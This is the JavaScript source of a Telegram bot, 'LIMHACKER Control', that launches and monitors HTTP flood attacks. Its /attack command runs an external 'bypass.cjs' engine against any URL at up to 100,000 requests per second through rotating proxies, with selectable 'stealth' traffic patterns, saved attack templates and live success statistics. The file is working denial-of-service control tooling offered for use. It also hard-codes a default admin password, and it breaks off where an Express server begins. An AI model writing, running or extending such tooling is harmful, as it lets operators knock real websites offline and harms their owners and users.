import { Telegraf } from 'telegraf';
import { spawn, exec } from 'child_process';
import fs from 'fs';
import dotenv from 'dotenv';
import express from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import os from 'os';
import crypto from 'crypto';
import session from 'express-session';
import bodyParser from 'body-parser';
import http from 'http';
import https from 'https';
import net from 'net';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Load environment variables
dotenv.config();
console.log('\x1b[31m%s\x1b[0m', '⚡ Initializing LIMHACKER Control System...');

const token = process.env.TELEGRAM_BOT_TOKEN;
if (!token) {
    console.error('\x1b[31m%s\x1b[0m', '❌ ERROR: TELEGRAM_BOT_TOKEN missing');
    process.exit(1);
}

const bot = new Telegraf(token);
const ADMIN_ID = '6247762383';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'limhacker2026';
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(32).toString('hex');

// ========== ADVANCED CONFIGURATION ==========
const CONFIG = {
    MAX_CONCURRENT_ATTACKS: 10,
    MAX_THREADS: 1000,
    MAX_RATE: 100000,
    MAX_DURATION: 7200,
    STATUS_UPDATE: 2000,
    METRICS_UPDATE: 5000,
    PROXY_CHECK: 60000,
    AUTO_SCALE: true,
    SCALE_THRESHOLD: 0.75,
    MAX_AUTO_THREADS: 500,
    ATTACK_PATTERNS: ['constant', 'square', 'saw', 'random', 'exponential', 'stealth'],
    MAX_PROXY_FAILS: 3,
    PROXY_TEST_TIMEOUT: 3000,
    AUTO_ROTATE_INTERVAL: 300000,
    MAX_MEMORY: 1024 * 1024 * 1024,
    MAX_CPU: 80,
    MAX_BANDWIDTH: 100 * 1024 * 1024,
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 5000
};

// ========== DATA STORES ==========
const attacks = new Map();
const templates = new Map();
const schedules = new Map();
const userSessions = new Map();
const commandHistory = [];

const metrics = {
    startTime: Date.now(),
    totalAttacks: 0,
    totalRequests: 0,
    totalBytes: 0,
    totalSuccess: 0,
    totalFail: 0,
    peakRPS: 0,
    bandwidth: [],
    responseTime: []
};

// ========== PROXY MANAGER ==========
class ProxyManager {
    constructor() {
        this.proxies = new Map();
        this.stats = {
            total: 0,
            active: 0,
            dead: 0,
            avgLatency: 0,
            lastCheck: Date.now()
        };
        this.loadProxies();
    }

    loadProxies() {
        if (!fs.existsSync('proxy.txt')) {
            console.log('\x1b[33m%s\x1b[0m', '⚠️ No proxy.txt file found');
            return;
        }
        
        try {
            const content = fs.readFileSync('proxy.txt', 'utf-8');
            const lines = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':'));
            
            this.proxies.clear();
            
            lines.forEach(proxy => {
                if (!this.proxies.has(proxy)) {
                    this.proxies.set(proxy, {
                        fails: 0,
                        latency: [],
                        lastUsed: 0,
                        successCount: 0,
                        failCount: 0,
                        protocol: proxy.startsWith('https') ? 'HTTPS' : 'HTTP',
                        status: 'untested',
                        lastTest: null
                    });
                }
            });
            
            this.updateStats();
            console.log('\x1b[31m%s\x1b[0m', `📡 Loaded ${this.proxies.size} proxies`);
        } catch (err) {
            console.error('Error loading proxies:', err);
        }
    }

    updateStats() {
        this.stats.total = this.proxies.size;
        this.stats.active = Array.from(this.proxies.values()).filter(d => d.fails < CONFIG.MAX_PROXY_FAILS && d.status === 'active').length;
        this.stats.dead = this.stats.total - this.stats.active;
        
        const latencies = Array.from(this.proxies.values())
            .flatMap(d => d.latency);
        this.stats.avgLatency = latencies.length > 0 
            ? Math.round(latencies.reduce((s, v) => s + v, 0) / latencies.length) 
            : 0;
        this.stats.lastCheck = Date.now();
    }

    async testSingleProxy(proxy) {
        const [host, port] = proxy.split(':');
        const start = Date.now();
        
        return new Promise((resolve) => {
            const socket = new net.Socket();
            
            const timeout = setTimeout(() => {
                socket.destroy();
                resolve({ proxy, success: false, latency: 0, error: 'timeout' });
            }, CONFIG.PROXY_TEST_TIMEOUT);

            socket.setTimeout(CONFIG.PROXY_TEST_TIMEOUT);
            
            socket.on('connect', () => {
                clearTimeout(timeout);
                const latency = Date.now() - start;
                socket.destroy();
                
                // Try HTTP request through proxy
                const httpSocket = net.createConnection(parseInt(port), host, () => {
                    httpSocket.write(`GET http://httpbin.org/get HTTP/1.1\r\nHost: httpbin.org\r\n\r\n`);
                    
                    const httpTimeout = setTimeout(() => {
                        httpSocket.destroy();
                        resolve({ proxy, success: true, latency, error: null });
                    }, 2000);
                    
                    httpSocket.once('data', () => {
                        clearTimeout(httpTimeout);
                        httpSocket.destroy();
                        resolve({ proxy, success: true, latency, error: null });
                    });
                    
                    httpSocket.on('error', () => {
                        clearTimeout(httpTimeout);
                        resolve({ proxy, success: true, latency, error: null });
                    });
                });
                
                httpSocket.on('error', () => {
                    resolve({ proxy, success: true, latency, error: null });
                });
            });

            socket.on('error', () => {
                clearTimeout(timeout);
                resolve({ proxy, success: false, latency: 0, error: 'connection_failed' });
            });

            socket.on('timeout', () => {
                clearTimeout(timeout);
                socket.destroy();
                resolve({ proxy, success: false, latency: 0, error: 'timeout' });
            });

            socket.connect(parseInt(port), host);
        });
    }

    async testAllProxies() {
        if (this.proxies.size === 0) {
            return { total: 0, active: 0, dead: 0 };
        }

        console.log('\x1b[33m%s\x1b[0m', '🔄 Testing all proxies...');
        
        const proxyList = Array.from(this.proxies.keys());
        const testPromises = proxyList.map(proxy => this.testSingleProxy(proxy));
        
        const results = await Promise.all(testPromises);
        
        let activeCount = 0;
        let deadCount = 0;
        
        results.forEach(result => {
            const data = this.proxies.get(result.proxy);
            if (result.success) {
                data.status = 'active';
                data.fails = 0;
                data.latency.push(result.latency);
                if (data.latency.length > 5) data.latency.shift();
                activeCount++;
            } else {
                data.status = 'dead';
                data.fails = CONFIG.MAX_PROXY_FAILS;
                deadCount++;
            }
            data.lastTest = Date.now();
        });

        this.updateStats();
        
        return {
            total: this.proxies.size,
            active: activeCount,
            dead: deadCount,
            timestamp: Date.now()
        };
    }

    getStats() {
        return this.stats;
    }

    getProxyList(limit = 20) {
        const proxies = Array.from(this.proxies.entries())
            .map(([proxy, data]) => ({
                proxy,
                status: data.status || 'untested',
                latency: data.latency.length > 0 ? Math.round(data.latency.reduce((s, v) => s + v, 0) / data.latency.length) : null,
                fails: data.fails,
                lastUsed: data.lastUsed ? new Date(data.lastUsed).toLocaleTimeString() : 'never',
                lastTest: data.lastTest ? new Date(data.lastTest).toLocaleTimeString() : 'never'
            }))
            .sort((a, b) => {
                if (a.status === 'active' && b.status !== 'active') return -1;
                if (a.status !== 'active' && b.status === 'active') return 1;
                return 0;
            })
            .slice(0, limit);
        
        return proxies;
    }
}

const proxyManager = new ProxyManager();

// ========== SYSTEM MONITOR ==========
class SystemMonitor {
    async getStats() {
        try {
            const cpus = os.cpus();
            const totalMem = os.totalmem();
            const freeMem = os.freemem();
            const usedMem = totalMem - freeMem;
            
            const loadAvg = os.loadavg();
            const cpuCount = cpus.length;
            const cpuPercent = Math.min(100, Math.round((loadAvg[0] / cpuCount) * 100));
            
            return {
                cpu: cpuPercent || 0,
                memory: {
                    total: totalMem,
                    used: usedMem,
                    free: freeMem,
                    percentage: Math.round((usedMem / totalMem) * 100)
                },
                uptime: os.uptime(),
                hostname: os.hostname(),
                platform: os.platform(),
                arch: os.arch(),
                cpus: cpuCount,
                model: cpus[0]?.model || 'Unknown'
            };
        } catch (err) {
            console.error('Error getting system stats:', err);
            return null;
        }
    }
}

const systemMonitor = new SystemMonitor();

// ========== HELPER FUNCTIONS ==========
function countRunningAttacks() {
    let count = 0;
    for (const attack of attacks.values()) {
        if (attack.isRunning) count++;
    }
    return count;
}

function formatNumber(num) {
    if (num === undefined || num === null) return '0';
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function formatDuration(seconds) {
    const h = Math.floor(seconds / 3600);
    const m = Math.floor((seconds % 3600) / 60);
    const s = Math.floor(seconds % 60);
    return `${h.toString().padStart(2, '0')}:${m.toString().padStart(2, '0')}:${s.toString().padStart(2, '0')}`;
}

function calculateSuccessRate(attack) {
    if (!attack.requestCount) return 0;
    return Math.round((attack.successCount / attack.requestCount) * 100);
}

function createProgressBar(percent, size = 20) {
    const filled = Math.floor(percent / 5);
    const bar = '█'.repeat(filled);
    const empty = '░'.repeat(size - filled);
    return bar + empty;
}

function loadAndCleanProxies() {
    if (!fs.existsSync('proxy.txt')) return [];
    try {
        const content = fs.readFileSync('proxy.txt', 'utf-8');
        return content.split('\n')
            .map(line => line.trim())
            .filter(line => line && line.includes(':'));
    } catch {
        return [];
    }
}

function validateUrl(url) {
    try {
        new URL(url);
        return true;
    } catch {
        return false;
    }
}

// ========== TELEGRAM BOT COMMANDS ==========
bot.start((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    LIMHACKER CONTROL v4.0                    │
├──────────────────────────────────────────────────────────────┤
│  Welcome, ${ctx.from.first_name}                              │
│  Status: ONLINE                                              │
│  Role: ${isAdmin ? 'ADMINISTRATOR' : 'OPERATOR'}             │
├──────────────────────────────────────────────────────────────┤
│  Commands:                                                    │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│  /stop <id>                                                  │
│  /list                                                       │
│  /stats                                                      │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>                                                │
│  /templates                                                  │
│  /setproxy (admin only)                                      │
│  /proxies (admin only)                                       │
│  /system                                                     │
│  /help                                                       │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.help((ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    
    let adminSection = '';
    if (isAdmin) {
        adminSection = `
│  PROXY COMMANDS (ADMIN ONLY)                                   │
│  ──────────────────────────────────────────────────────────  │
│  /setproxy      - Upload proxy.txt file                      │
│  /proxies       - Show proxy statistics                      │
│  /proxy test    - Test all proxies                           │
│  /proxy list    - List all proxies with status               │
│  /proxy reload  - Reload proxy file                          │`;
    } else {
        adminSection = `
│  PROXY COMMANDS (RESTRICTED)                                   │
│  ──────────────────────────────────────────────────────────  │
│  🔒 Proxy management is restricted to administrators         │`;
    }
    
    ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    COMMAND REFERENCE                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /attack <url> <time> <rate> <threads> [pattern]            │
│    - url: target (http:// or https://)                       │
│    - time: duration in seconds (max: ${CONFIG.MAX_DURATION}) │
│    - rate: requests/second (max: ${CONFIG.MAX_RATE})         │
│    - threads: parallel threads (max: ${CONFIG.MAX_THREADS})  │
│    - pattern: constant, square, saw, random, exponential     │
│                                                              │
│  /stop <id>     - Stop specific attack                       │
│  /list          - List active attacks                        │
│  /stats         - System statistics                          │
│                                                              │
│  TEMPLATE COMMANDS                                            │
│  ──────────────────────────────────────────────────────────  │
│  /save <name> <url> <time> <rate> <threads> [pattern]       │
│  /load <name>   - Load and execute template                  │
│  /templates     - List all templates                         │
│                                                              │${adminSection}
│  SYSTEM COMMANDS                                              │
│  ──────────────────────────────────────────────────────────  │
│  /system        - System information                         │
│  /help          - Show this help                             │
└──────────────────────────────────────────────────────────────┘
    `);
});

bot.command('test', (ctx) => ctx.reply('✅ LIMHACKER system operational'));

// ========== ATTACK COMMAND ==========
bot.command('attack', async (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [url, time, rate, threads, pattern = 'constant'] = args;

    if (!url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /attack <url> <time> <rate> <threads> [pattern]');
    }

    if (!validateUrl(url)) {
        return ctx.reply('❌ Invalid URL format');
    }

    if (countRunningAttacks() >= CONFIG.MAX_CONCURRENT_ATTACKS) {
        return ctx.reply('⚠️ Maximum concurrent attacks reached');
    }

    if (!fs.existsSync('bypass.cjs')) {
        return ctx.reply('❌ Attack engine not found');
    }

    const proxies = loadAndCleanProxies();
    const attackId = crypto.randomBytes(4).toString('hex').toUpperCase();
    const duration = Math.min(parseInt(time), CONFIG.MAX_DURATION);
    const attackRate = Math.min(parseInt(rate), CONFIG.MAX_RATE);
    const attackThreads = Math.min(parseInt(threads), CONFIG.MAX_THREADS);
    const attackPattern = CONFIG.ATTACK_PATTERNS.includes(pattern) ? pattern : 'constant';
    const startTime = Date.now();

    const statusMsg = await ctx.replyWithMarkdown(`
┌──────────────────────────────────────────────────────────────┐
│                    ATTACK INITIALIZED                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${url.substring(0, 50)}                             │
├──────────────────────────────────────────────────────────────┤
│  Duration: ${duration}s                                      │
│  Rate: ${attackRate.toLocaleString()}/s                      │
│  Threads: ${attackThreads}                                   │
│  Pattern: ${attackPattern.toUpperCase()}                     │
│  Proxies: ${proxies.length}                                  │
└──────────────────────────────────────────────────────────────┘
    `);

    const attack = spawn('node', [
        'bypass.cjs',
        url,
        duration.toString(),
        attackRate.toString(),
        attackThreads.toString(),
        'proxy.txt',
        attackPattern
    ]);

    attacks.set(attackId, {
        process: attack,
        url,
        startTime,
        duration,
        rate: attackRate,
        threads: attackThreads,
        pattern: attackPattern,
        userId: ctx.from.id,
        username: ctx.from.username || ctx.from.first_name,
        chatId: ctx.chat.id,
        messageId: statusMsg.message_id,
        requestCount: 0,
        successCount: 0,
        failCount: 0,
        bytesTransferred: 0,
        statusCodes: {},
        responseTimes: [],
        isRunning: true,
        lastUpdate: Date.now()
    });

    attack.stdout.on('data', (data) => {
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        const output = data.toString();
        
        if (output.includes('Status: [')) {
            const match = output.match(/Status: \[([^\]]+)\]/);
            if (match) {
                const parts = match[1].split(', ');
                let total = 0;
                let success = 0;
                let bytes = 0;
                
                parts.forEach(part => {
                    const [code, count] = part.split(': ');
                    if (count) {
                        const numCount = parseInt(count);
                        total += numCount;
                        if (code.startsWith('2')) success += numCount;
                        attackData.statusCodes[code] = (attackData.statusCodes[code] || 0) + numCount;
                        bytes += numCount * 1024;
                    }
                });
                
                attackData.requestCount = total;
                attackData.successCount = success;
                attackData.failCount = total - success;
                attackData.bytesTransferred += bytes;
                
                metrics.totalRequests += total - (attackData.lastTotal || 0);
                metrics.totalSuccess += success - (attackData.lastSuccess || 0);
                metrics.totalFail += (total - success) - (attackData.lastFail || 0);
                metrics.totalBytes += bytes;
                
                const now = Date.now();
                const timeDiff = (now - attackData.lastUpdate) / 1000;
                const reqDiff = total - (attackData.lastTotal || 0);
                const currentRPS = Math.floor(reqDiff / timeDiff);
                
                if (currentRPS > metrics.peakRPS) {
                    metrics.peakRPS = currentRPS;
                }
                
                const mbps = (bytes * 8) / (1024 * 1024 * timeDiff);
                metrics.bandwidth.push(mbps);
                if (metrics.bandwidth.length > 60) metrics.bandwidth.shift();
                
                attackData.lastTotal = total;
                attackData.lastSuccess = success;
                attackData.lastFail = total - success;
                attackData.lastUpdate = now;
            }
        }
    });

    attack.stderr.on('data', (data) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Error:`, data.toString());
    });

    attack.on('error', (err) => {
        console.error('\x1b[31m%s\x1b[0m', `[${attackId}] Process error:`, err.message);
        ctx.reply(`⚠️ Attack error: ${err.message}`);
        attacks.delete(attackId);
    });

    const updateInterval = setInterval(() => {
        const attackData = attacks.get(attackId);
        if (!attackData || !attackData.isRunning) {
            clearInterval(updateInterval);
            return;
        }

        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / attackData.duration) * 100));
        const successRate = calculateSuccessRate(attackData);
        
        const now = Date.now();
        const timeDiff = (now - attackData.lastUpdate) / 1000;
        const reqDiff = attackData.requestCount - (attackData.lastTotal || 0);
        const currentRPS = Math.floor(reqDiff / Math.max(0.1, timeDiff));
        
        const topCodes = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .slice(0, 3)
            .map(([code, count]) => `HTTP ${code}: ${count}`)
            .join(' | ');

        const progressBar = createProgressBar(percent);
        const bandwidth = (attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed));
        
        const updateMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK IN PROGRESS                         │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Progress: ${progressBar} ${percent}%                        │
│  Elapsed: ${elapsed}s / ${attackData.duration}s              │
├──────────────────────────────────────────────────────────────┤
│  Requests: ${formatNumber(attackData.requestCount)}          │
│  Success: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Current RPS: ${currentRPS}                                  │
│  Bandwidth: ${bandwidth.toFixed(2)} Mbps                     │
│  Status: ${topCodes || 'Collecting...'}                      │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, updateMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
    }, CONFIG.STATUS_UPDATE);

    attack.on('close', (code) => {
        clearInterval(updateInterval);
        
        const attackData = attacks.get(attackId);
        if (!attackData) return;
        
        attackData.isRunning = false;
        metrics.totalAttacks++;
        
        const elapsed = Math.floor((Date.now() - attackData.startTime) / 1000);
        const successRate = calculateSuccessRate(attackData);
        const avgRPS = Math.floor(attackData.requestCount / Math.max(1, elapsed));
        
        const codeBreakdown = Object.entries(attackData.statusCodes)
            .sort((a, b) => b[1] - a[1])
            .map(([code, count]) => `  HTTP ${code}: ${formatNumber(count)}`)
            .join('\n');

        const finalMessage = 
`┌──────────────────────────────────────────────────────────────┐
│                    ATTACK COMPLETE                            │
├──────────────────────────────────────────────────────────────┤
│  ID: ${attackId}                                             │
│  Target: ${attackData.url}                                   │
│  Duration: ${elapsed}s / ${attackData.duration}s             │
├──────────────────────────────────────────────────────────────┤
│  Total Requests: ${formatNumber(attackData.requestCount)}    │
│  Successful: ${formatNumber(attackData.successCount)} (${successRate}%) │
│  Failed: ${formatNumber(attackData.failCount)}               │
│  Average RPS: ${avgRPS}                                      │
│  Bandwidth: ${((attackData.bytesTransferred * 8) / (1024 * 1024 * Math.max(1, elapsed))).toFixed(2)} Mbps │
├──────────────────────────────────────────────────────────────┤
│  Status Code Analysis:                                        │
${codeBreakdown || '  No data collected'}
├──────────────────────────────────────────────────────────────┤
│  Operator: ${attackData.username}                            │
│  Pattern: ${attackData.pattern.toUpperCase()}                │
│  Exit Code: ${code}                                          │
└──────────────────────────────────────────────────────────────┘`;

        ctx.telegram.editMessageText(attackData.chatId, attackData.messageId, null, finalMessage, { parse_mode: 'Markdown' })
            .catch(() => {});
        
        attacks.delete(attackId);
    });
});

// ========== STOP COMMAND ==========
bot.command('stop', (ctx) => {
    const attackId = ctx.message.text.split(' ')[1];
    const attack = attacks.get(attackId);
    
    if (!attack) return ctx.reply('❌ Attack not found');
    
    if (attack.userId !== ctx.from.id && ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ Not authorized to stop this attack');
    }

    attack.process.kill('SIGINT');
    ctx.reply(`🛑 Attack ${attackId} terminated`);
});

// ========== LIST COMMAND ==========
bot.command('list', (ctx) => {
    if (attacks.size === 0) return ctx.reply('📊 No active attacks');

    let msg = '┌──────────────────────────────────────────────────────────────┐\n';
    msg += '│                    ACTIVE ATTACKS                               │\n';
    msg += '├──────────────────────────────────────────────────────────────┤\n';
    
    attacks.forEach((a, id) => {
        if (!a.isRunning) return;
        const elapsed = Math.floor((Date.now() - a.startTime) / 1000);
        const percent = Math.min(100, Math.floor((elapsed / a.duration) * 100));
        const progressBar = createProgressBar(percent, 10);
        
        msg += `│  ID: ${id} | ${a.username}\n`;
        msg += `│  ${a.url.substring(0, 40)}...\n`;
        msg += `│  ${progressBar} ${percent}% | ${elapsed}s/${a.duration}s\n`;
        msg += `│  Req: ${formatNumber(a.requestCount)} | Success: ${calculateSuccessRate(a)}%\n`;
        msg += '├──────────────────────────────────────────────────────────────┤\n';
    });
    
    msg += `└──────────────────────────────────────────────────────────────┘`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== STATS COMMAND ==========
bot.command('stats', (ctx) => {
    const isAdmin = ctx.from.id.toString() === ADMIN_ID;
    const running = countRunningAttacks();
    const totalReqs = Array.from(attacks.values()).reduce((s, a) => s + (a.requestCount || 0), 0);
    const totalSuccess = Array.from(attacks.values()).reduce((s, a) => s + (a.successCount || 0), 0);
    
    let proxyInfo = '';
    if (isAdmin) {
        const proxyStats = proxyManager.getStats();
        proxyInfo = `
│  PROXY NETWORK (ADMIN)                                         │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${proxyStats.total}                                   │
│  Active: ${proxyStats.active}                                 │
│  Avg Latency: ${proxyStats.avgLatency}ms                      │
│                                                              │`;
    }
    
    const uptime = process.uptime();
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM STATISTICS                          │
├──────────────────────────────────────────────────────────────┤
│  ATTACK METRICS                                               │
│  ──────────────────────────────────────────────────────────  │
│  Active: ${running}/${CONFIG.MAX_CONCURRENT_ATTACKS}          │
│  Total Attacks: ${metrics.totalAttacks}                       │
│  Templates: ${templates.size}                                 │
│                                                              │
│  TRAFFIC ANALYSIS                                             │
│  ──────────────────────────────────────────────────────────  │
│  Total Requests: ${formatNumber(totalReqs)}                   │
│  Success Rate: ${totalReqs > 0 ? Math.round((totalSuccess / totalReqs) * 100) : 0}% │
│  Peak RPS: ${metrics.peakRPS}                                 │
│  Bandwidth: ${formatBytes(metrics.totalBytes)}                │
│                                                              │${proxyInfo}
│  SYSTEM                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Uptime: ${formatDuration(uptime)}                            │
│  Memory: ${formatBytes(process.memoryUsage().rss)}            │
│  CPU Cores: ${os.cpus().length}                               │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== PROXY COMMANDS - ADMIN ONLY ==========
bot.command('setproxy', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Only administrators can upload proxy files');
    }
    ctx.reply('📤 Send proxy.txt file (format: ip:port per line)\n\nExample:\n192.168.1.1:8080\n203.45.67.89:3128\n\n⚠️ This action is restricted to administrators only.');
});

bot.command('proxies', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Proxy information is restricted to administrators');
    }
    
    const stats = proxyManager.getStats();
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    PROXY NETWORK STATUS                       │
├──────────────────────────────────────────────────────────────┤
│  Total Proxies: ${stats.total}                                │
│  Active: ${stats.active}                                      │
│  Dead: ${stats.dead}                                          │
│  Average Latency: ${stats.avgLatency}ms                       │
│  Last Check: ${new Date(stats.lastCheck).toLocaleTimeString()} │
└──────────────────────────────────────────────────────────────┘

🔒 Admin Only Commands:
/proxy test - Test all proxies
/proxy list - List all proxies with status
/proxy reload - Reload proxy file`;
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('proxy', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: Proxy management is restricted to administrators');
    }
    
    const args = ctx.message.text.split(' ').slice(1);
    const subcmd = args[0];

    if (!subcmd) {
        return ctx.reply('❌ Usage: /proxy <test|list|reload>');
    }

    if (subcmd === 'test') {
        const msg = await ctx.reply('🔄 Testing all proxies... (This may take a moment)');
        
        try {
            const results = await proxyManager.testAllProxies();
            
            const resultMsg = 
`✅ Proxy Test Complete

Results:
• Total: ${results.total}
• Active: ${results.active}
• Dead: ${results.dead}
• Time: ${new Date(results.timestamp).toLocaleTimeString()}

Use /proxy list to see detailed status`;
            
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, resultMsg);
        } catch (error) {
            await ctx.telegram.editMessageText(ctx.chat.id, msg.message_id, null, `❌ Error testing proxies: ${error.message}`);
        }
        
    } else if (subcmd === 'list') {
        const proxies = proxyManager.getProxyList(15);
        
        if (proxies.length === 0) {
            return ctx.reply('📭 No proxies loaded. Use /setproxy to upload a proxy file.');
        }
        
        let listMsg = '📋 *Proxy List (Admin Only)*\n\n';
        proxies.forEach((p, index) => {
            const statusIcon = p.status === 'active' ? '✅' : p.status === 'dead' ? '❌' : '⏳';
            const latencyStr = p.latency ? `${p.latency}ms` : 'untested';
            listMsg += `${index + 1}. ${statusIcon} \`${p.proxy}\`\n`;
            listMsg += `   Status: ${p.status} | Latency: ${latencyStr} | Fails: ${p.fails}\n`;
            listMsg += `   Last Test: ${p.lastTest}\n\n`;
        });
        
        listMsg += `_Showing ${proxies.length} of ${proxyManager.getStats().total} proxies_`;
        
        ctx.reply(listMsg, { parse_mode: 'Markdown' });
        
    } else if (subcmd === 'reload') {
        proxyManager.loadProxies();
        ctx.reply(`🔄 Proxy file reloaded. Total proxies: ${proxyManager.getStats().total}`);
        
    } else {
        ctx.reply('❌ Unknown proxy command. Use: /proxy test, /proxy list, or /proxy reload');
    }
});

// ========== FILE HANDLER - ADMIN ONLY ==========
bot.on('document', async (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) {
        return ctx.reply('⛔ ACCESS DENIED: File uploads are restricted to administrators');
    }

    if (ctx.message.document.file_name === 'proxy.txt') {
        const waitMsg = await ctx.reply('🔄 Processing proxy file... (Admin operation)');
        
        try {
            const file = await ctx.telegram.getFile(ctx.message.document.file_id);
            const fileUrl = `https://api.telegram.org/file/bot${token}/${file.file_path}`;
            const response = await fetch(fileUrl);
            const content = await response.text();
            
            const proxies = content.split('\n')
                .map(l => l.trim())
                .filter(l => l && l.includes(':') && !l.startsWith('#'));
            
            if (proxies.length === 0) {
                return ctx.reply('❌ No valid proxies found in file. Format should be ip:port per line.');
            }
            
            fs.writeFileSync('proxy.txt', proxies.join('\n'));
            proxyManager.loadProxies();
            
            await ctx.telegram.editMessageText(
                ctx.chat.id,
                waitMsg.message_id,
                null,
                `✅ Loaded ${proxies.length} proxies\n\nUse /proxy test to check which ones are working.`
            );
        } catch (error) {
            ctx.reply('❌ Failed: ' + error.message);
        }
    } else {
        ctx.reply('❌ Invalid file. Please upload proxy.txt');
    }
});

// ========== TEMPLATE COMMANDS ==========
bot.command('save', (ctx) => {
    const args = ctx.message.text.split(' ').slice(1);
    const [name, url, time, rate, threads, pattern = 'constant'] = args;
    
    if (!name || !url || !time || !rate || !threads) {
        return ctx.reply('❌ Usage: /save <name> <url> <time> <rate> <threads> [pattern]');
    }
    
    templates.set(name, { url, time, rate, threads, pattern });
    ctx.reply(`✅ Template saved: \`${name}\``);
});

bot.command('load', (ctx) => {
    const name = ctx.message.text.split(' ')[1];
    const template = templates.get(name);
    
    if (!template) return ctx.reply('❌ Template not found');
    
    const fakeMsg = {
        message: {
            text: `/attack ${template.url} ${template.time} ${template.rate} ${template.threads} ${template.pattern}`,
            chat: ctx.chat,
            from: ctx.from
        }
    };
    bot.command('attack')(fakeMsg);
});

bot.command('templates', (ctx) => {
    if (templates.size === 0) return ctx.reply('📭 No templates');
    
    let msg = '📋 *Templates*\n\n';
    templates.forEach((data, name) => {
        msg += `*${name}*\n`;
        msg += `  Target: ${data.url}\n`;
        msg += `  Duration: ${data.time}s | Rate: ${data.rate}/s | Threads: ${data.threads}\n`;
        msg += `  Pattern: ${data.pattern.toUpperCase()}\n\n`;
    });
    
    ctx.reply(msg, { parse_mode: 'Markdown' });
});

bot.command('delete', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const name = ctx.message.text.split(' ')[1];
    if (templates.delete(name)) {
        ctx.reply(`✅ Template deleted: ${name}`);
    } else {
        ctx.reply('❌ Template not found');
    }
});

// ========== STOP ALL ==========
bot.command('stopall', (ctx) => {
    if (ctx.from.id.toString() !== ADMIN_ID) return ctx.reply('⛔ Unauthorized');
    
    const count = attacks.size;
    attacks.forEach((a) => {
        if (a.isRunning) a.process.kill('SIGINT');
    });
    attacks.clear();
    ctx.reply(`🛑 Stopped ${count} attacks`);
});

// ========== SYSTEM COMMAND ==========
bot.command('system', async (ctx) => {
    const stats = await systemMonitor.getStats();
    if (!stats) return ctx.reply('❌ Could not retrieve system stats');
    
    const msg = 
`┌──────────────────────────────────────────────────────────────┐
│                    SYSTEM INFORMATION                         │
├──────────────────────────────────────────────────────────────┤
│  CPU                                                          │
│  ──────────────────────────────────────────────────────────  │
│  Usage: ${stats.cpu}%                                         │
│  Cores: ${os.cpus().length}                                   │
│  Model: ${os.cpus()[0].model.substring(0, 30)}...            │
│                                                              │
│  MEMORY                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Total: ${formatBytes(stats.memory.total)}                    │
│  Used: ${formatBytes(stats.memory.used)} (${stats.memory.percentage}%) │
│  Free: ${formatBytes(stats.memory.free)}                      │
│                                                              │
│  SYSTEM                                                       │
│  ──────────────────────────────────────────────────────────  │
│  Hostname: ${stats.hostname}                                  │
│  Platform: ${stats.platform} ${stats.arch}                    │
│  Uptime: ${formatDuration(stats.uptime)}                      │
└──────────────────────────────────────────────────────────────┘`;

    ctx.reply(msg, { parse_mode: 'Markdown' });
});

// ========== ERROR HANDLING ==========
bot.catch((err, ctx) => {
    console.error('\x1b[31m%s\x1b[0m', `[ERROR] ${err.message}`);
});

// ========== EXPRESS SERVER WITH FULL BOT INTEGRATION ==========
const app = express();
